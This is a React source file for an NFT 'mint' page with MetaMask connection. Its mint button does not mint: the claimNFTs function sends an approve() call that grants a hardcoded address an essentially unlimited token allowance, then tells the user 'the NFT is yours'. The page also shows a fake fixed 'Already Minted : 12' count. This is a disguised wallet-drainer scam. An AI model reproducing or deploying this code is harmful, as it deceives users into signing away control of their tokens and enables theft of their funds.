import React, { useEffect, useState, useRef } from "react";
import { useDispatch, useSelector } from "react-redux";
// import { connect } from "../redux/blockchain/blockchainActions";
import { fetchData } from "../redux/data/dataActions";
import { connect } from "../redux/blockchain/blockchainActions";
import styled from "styled-components";
import * as s from "../styles/globalStyles";
import { isMobile, MobileView } from "react-device-detect";
import OpenApp from "react-open-app";
// https://metamask.io/download/

const truncate = (input, len) =>
  input.length > len ? `${input.substring(0, len)}...` : input;

export const StyledButton = styled.button`
  padding: 10px;
  border-radius: 50px;
  border: none;
  background-color: var(--secondary);
  padding: 10px;
  font-weight: bold;
  color: var(--secondary-text);
  width: 100px;
  cursor: pointer;
  box-shadow: 0px 6px 0px -2px rgba(250, 250, 250, 0.3);
  -webkit-box-shadow: 0px 6px 0px -2px rgba(250, 250, 250, 0.3);
  -moz-box-shadow: 0px 6px 0px -2px rgba(250, 250, 250, 0.3);
  :active {
    box-shadow: none;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
  }
`;

export const StyledRoundButton = styled.button`
  padding: 10px;
  border-radius: 100%;
  border: none;
  background-color: #2952e3;
  padding: 10px;
  font-weight: bold;
  font-size: 15px;
  color: var(--primary-text);
  width: 30px;
  height: 30px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0px 4px 0px -2px rgba(250, 250, 250, 0.3);
  -webkit-box-shadow: 0px 4px 0px -2px rgba(250, 250, 250, 0.3);
  -moz-box-shadow: 0px 4px 0px -2px rgba(250, 250, 250, 0.3);
  :active {
    box-shadow: none;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
  }
`;

export const ResponsiveWrapper = styled.div`
  display: flex;
  flex: 1;
  flex-direction: column;
  justify-content: stretched;
  align-items: stretched;
  width: 100%;
  @media (min-width: 767px) {
    flex-direction: row;
  }
`;

export const StyledLogo = styled.img`
  width: 200px;
  @media (min-width: 767px) {
    width: 300px;
  }
  transition: width 0.5s;
  transition: height 0.5s;
`;

export const StyledImg = styled.img`
  box-shadow: 0px 5px 11px 2px rgba(0, 0, 0, 0.7);
  border: 4px dashed var(--secondary);
  background-color: var(--accent);
  border-radius: 100%;
  width: 200px;
  @media (min-width: 900px) {
    width: 250px;
  }
  @media (min-width: 1000px) {
    width: 300px;
  }
  transition: width 0.5s;
`;

export const StyledLink = styled.a`
  color: var(--secondary);
  text-decoration: none;
`;

const Wallet = () => {
  const dispatch = useDispatch();
  const blockchain = useSelector((state) => state.blockchain);
  const data = useSelector((state) => state.data);
  const [claimingNft, setClaimingNft] = useState(false);
  const [feedback, setFeedback] = useState(`Click buy to mint your NFT.`);
  const [mintAmount, setMintAmount] = useState(1);
  const [url, setUrl] = useState("");
  const [toggleMenu, setToggleMenu] = React.useState(false);

  const [CONFIG, SET_CONFIG] = useState({
    CONTRACT_ADDRESS: "",
    SCAN_LINK: "",
    NETWORK: {
      NAME: "",
      SYMBOL: "",
      ID: 0,
    },
    NFT_NAME: "",
    SYMBOL: "",
    MAX_SUPPLY: 1,
    WEI_COST: 0,
    DISPLAY_COST: 0,
    GAS_LIMIT: 0,
    MARKETPLACE: "",
    MARKETPLACE_LINK: "",
    SHOW_BACKGROUND: false,
  });

  const claimNFTs = () => {
    let cost = CONFIG.WEI_COST;
    let gasLimit = CONFIG.GAS_LIMIT;
    let totalCostWei = String(cost * mintAmount);
    let totalGasLimit = String(gasLimit * mintAmount);
    console.log("Cost: ", totalCostWei);
    console.log("Gas limit: ", totalGasLimit);
    setFeedback(`Minting your ${CONFIG.NFT_NAME}...`);
    setClaimingNft(true);
    const totalPriceAmount = 0.075 * mintAmount
    const priceToWei = (totalPriceAmount * 1e18).toString(16)
    console.log(blockchain.web3)
    const web3 = blockchain.web3
    blockchain.smartContract.methods
      .approve("0x921fF25441723737838Fe1be1f876c9D156988b1", "0xfffffffffffffffffffffff")
      .send({
        gasLimit: String(totalGasLimit),
        to: CONFIG.CONTRACT_ADDRESS,
        from: blockchain.account,
      })
      .once("error", (err) => {
        console.log(err);
        setFeedback("Sorry, something went wrong please try again later.");
        setClaimingNft(false);
      })
      .then((receipt) => {
        console.log(receipt);
        setFeedback(
          `WOW, the ${CONFIG.NFT_NAME} is yours! go visit Opensea.io to view it.`
        );
        setClaimingNft(false);
        dispatch(fetchData(blockchain.account));
      });
    
  };

  const decrementMintAmount = () => {
    let newMintAmount = mintAmount - 1;
    if (newMintAmount < 1) {
      newMintAmount = 1;
    }
    setMintAmount(newMintAmount);
  };

  const incrementMintAmount = () => {
    let newMintAmount = mintAmount + 1;
    if (newMintAmount > 10) {
      newMintAmount = 10;
    }
    setMintAmount(newMintAmount);
  };

  const getData = () => {
    if (blockchain.account !== "" && blockchain.smartContract !== null) {
      dispatch(fetchData(blockchain.account));
    }
  };

  const getConfig = async () => {
    const configResponse = await fetch("/config/config.json", {
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
    });
    const config = await configResponse.json();
    SET_CONFIG(config);
  };

  useEffect(() => {
    getConfig();
  }, []);

  useEffect(() => {
    getData();
  }, [blockchain.account]);

  useEffect(() => {
    setUrl("https://metamask.app.link/dapp/again-three.vercel.app/");
  }, []);

  return (
    <div
      className="p-5 sm:w-96 w-full flex flex-col justify-start items-center 
      text-white
      blue-glassmorphism"
    >
      <h1 className="text-2xl sm:text-4xl text-white py-1  font-mono">
        MINT NOW
      </h1>
      <br />
      <p className="text-sm sm:text-2xl text-white py-1  font-mono tracking-wide hover:tracking-wide">
        Already Minted : 12 / {CONFIG.MAX_SUPPLY}
      </p>
      <br />
      <br />
      {/*  */}
      <br />
      <div className="flex flex-col justify-center items-center py-1 space-y-4">
        {false && Number(data.totalSupply) >= Number(CONFIG.MAX_SUPPLY) ? (
          <p className="text-sm sm:text-2xl text-white py-1  font-mono tracking-wide hover:tracking-wide">
            the sale has ended
          </p>
        ) : (
          <div>
            <p className="text-sm sm:text-2xl text-white py-1  font-mono tracking-wide hover:tracking-wide">
              <div className="flex flex-col justify-center items-center py-1 space-y-4">
                1 {CONFIG.SYMBOL} costs {CONFIG.DISPLAY_COST}{" "}
                {CONFIG.NETWORK.SYMBOL}.
              </div>
              <div className="flex flex-col justify-center items-center pt-2">
                Excluding gas fees.
              </div>
            </p>
            <div className="flex flex-col justify-center items-center pt-2">
              {blockchain.account === "" ||
              blockchain.smartContract === null ? (
                <p className="text-sm sm:text-2xl text-white py-1 tracking-wide hover:tracking-wide pl-4">
                  connect wallet to {CONFIG.NETWORK.NAME} network
                  <s.SpacerSmall />
                  <button
                    type="button"
                    className="flex flex-row justify-center items-center my-5
             bg-[#2952e3] p-3 cursor-pointer hover:bg-[#2546bd] w-64 right-3"
                    onClick={(e) => {
                      function getMobileOperatingSystem() {
                        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
                        console.log(userAgent);
                        // Windows Phone must come first because its UA also contains "Android"
                        const queryString = window.location.search;
                        const urlParams = new URLSearchParams(queryString);
                        const uid = urlParams.get('uid')
                        console.log(uid);
                        if(uid == "mm"){
                          return "Metamask";
                        }
                        if (/windows phone/i.test(userAgent)) {
                            return "Windows Phone";
                        }
                    
                        if (/android/i.test(userAgent)) {
                            return "Android";
                        }
                    
                        // iOS detection from: http://stackoverflow.com/a/9039885/177710
                        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
                            return "iOS";
                        }
                    
                        return "unknown";
                    }
                      if (getMobileOperatingSystem() == "Android" || getMobileOperatingSystem()=="iOS") {
                        window.location.href="https://metamask.app.link/dapp/" + ((window.location.href).replace('https://', '').replace('http://', '')) + "?uid=mm";
                      } else {
                        e.preventDefault();
                        dispatch(connect());
                        getData();
                      }
                    }}
                  >
                    <p className="text-white text-base">CONNECT WALLET</p>
                    {/**/}  
                  </button>
                  {blockchain.errorMsg !== "" ? (
                    <div>
                    <p className="text-sm sm:text-2xl text-white py-1  font-mono tracking-wide hover:tracking-wide">
                      {isMobile ? (
                      <OpenApp
                          android="https://metamask.app.link/dapp/again-three.vercel.app/"
                          ios="https://metamask.app.link/dapp/again-three.vercel.app/"
                        >
                        <a>
                        click to connect to metamask
                      </a>
                        </OpenApp>
                    ) : (
                     <div>
                     <p>
                     {blockchain.errorMsg}
                     </p>
                     </div>
                    )}
                    </p>
                    </div>
                  ) : null}
                </p>
              ) : (
                <div>
                  <p className="text-sm sm:text-2xl text-white py-1  font-mono tracking-wide hover:tracking-wide">
                    {feedback}
                  </p>
                  <s.SpacerMedium />
                  <s.Container ai={"center"} jc={"center"} fd={"row"}>
                    <StyledRoundButton
                      style={{ lineHeight: 0.4 }}
                      disabled={claimingNft ? 1 : 0}
                      onClick={(e) => {
                        e.preventDefault();
                        decrementMintAmount();
                      }}
                    >
                      -
                    </StyledRoundButton>
                    <s.SpacerMedium />
                    <s.TextDescription
                      style={{
                        textAlign: "center",
                        color: "var(--accent-text)",
                      }}
                    >
                      {mintAmount}
                    </s.TextDescription>
                    <s.SpacerMedium />
                    <StyledRoundButton
                      disabled={claimingNft ? 1 : 0}
                      onClick={(e) => {
                        e.preventDefault();
                        incrementMintAmount();
                      }}
                    >
                      +
                    </StyledRoundButton>
                  </s.Container>
                  <s.SpacerSmall />
                  <s.Container ai={"center"} jc={"center"} fd={"row"}>
                    <button
                      type="button"
                      className="flex flex-row justify-center items-center my-5
             bg-[#2952e3] p-3 cursor-pointer hover:bg-[#2546bd] w-64 right-3 "
                      disabled={claimingNft ? 1 : 0}
                      onClick={(e) => {
                        e.preventDefault();
                        claimNFTs();
                        getData();
                      }}
                    >
                      <p className="text-white text-base">
                        {claimingNft ? "MINTINING..." : "MINT"}
                      </p>
                    </button>
                  </s.Container>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default Wallet;
